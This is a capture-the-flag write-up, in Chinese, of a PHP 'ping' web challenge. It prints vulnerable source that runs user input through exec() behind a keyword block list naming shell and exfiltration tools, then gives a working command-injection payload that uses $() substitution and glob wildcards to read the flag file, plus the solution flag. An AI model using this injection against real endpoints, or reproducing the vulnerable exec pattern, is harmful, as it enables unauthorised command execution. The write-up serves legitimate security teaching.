# PHM #19 Web — ping

| 項目 | 值 |
|:---|:---|
| 類別 | Web |
| 分數 | 90 |

## 題目

> Can you ping 127.0.0.1?
>
> 連結: [`/ping/`](https://ctf.hackme.quest/ping/)

網站本身 `highlight_file(__FILE__)` 把 source code 印出來:

```php
$blacklist = [
    'flag', 'cat', 'nc', 'sh', 'cp', 'touch', 'mv', 'rm', 'ps', 'top', 'sleep', 'sed',
    'apt', 'yum', 'curl', 'wget', 'perl', 'python', 'zip', 'tar', 'php', 'ruby', 'kill',
    'passwd', 'shadow', 'root', 'z',
    'dir', 'dd', 'df', 'du', 'free', 'tempfile', 'touch', 'tee', 'sha', 'x64', 'g',
    'xargs', 'PATH', '$0', 'proc',
    '/', '&', '|', '>', '<', ';', '"', '\'', '\\', "\n"
];
function ping($ip) {
    if (strlen($ip) > 15) return 'IP toooooo longgggggggggg';
    foreach ($blacklist as $k)
        if (strstr($ip, $k)) return "{$k} not allowed";
    exec("ping -c 1 \"{$ip}\" 2>&1", $ret);
    return implode("\n", array_slice($ret, 0, 10));
}
```

## 分析

### 限制

- `strlen($ip) <= 15`
- 禁用大量關鍵字 (`flag`, `cat`, `php`, `g`, `z` 等等)
- 禁用 shell 分隔符 (`/`, `&`, `|`, `>`, `<`, `;`, `"`, `'`, `\`, `\n`)

但**沒禁** `` ` ``, `$`, `(`, `)`, `*`, `?`. 可以用 `$()` 做 command substitution.

### 兩個情報搜集

Payload `$(ls)` → 顯示 `ping: 1flag.php\nindex.php: Name or service not known` → 檔案是 `flag.php` 跟 `index.php`.

### Payload 設計

要讀 `flag.php` 但不能打 `flag` 跟 `php`. 用 glob 繞:

- `fla?` ≠ `flag` (差一個字)
- `p??` ≠ `php`
- 整個檔名 glob: `fla?.p??`

要讀檔但不能用 `cat`. 用 `tac` (reverse cat, 不在 blacklist):

```
$(tac fla?.p??)
```

長度剛好 **15 chars** (`$` `(` `t` `a` `c` ` ` `f` `l` `a` `?` `.` `p` `?` `?` `)`).

結果 ping 把檔案內容塞進 hostname → "Name or service not known" error 把內容吐回來.

## 解法

```bash
curl 'https://ctf.hackme.quest/ping/?ip=$(tac%20fla%3F.p%3F%3F)'
# -> ping: $flag = 'FLAG{ping_$(capture-the-flag)_UtUbtnvY5F9Hn5dR}';
# -> <?php: Name or service not known
```

## Flag

```
FLAG{ping_$(capture-the-flag)_UtUbtnvY5F9Hn5dR}
```

## 感想

Blacklist-based filtering 典型爛掉:
1. 禁 `cat`, 用 **`tac`**
2. 禁 `flag` / `php` 字串, 用 **`?` glob 繞**
3. 15 字長度 cap, 剛好塞下 `$(tac fla?.p??)` (正好 15)

Blacklist 永遠漏東西.
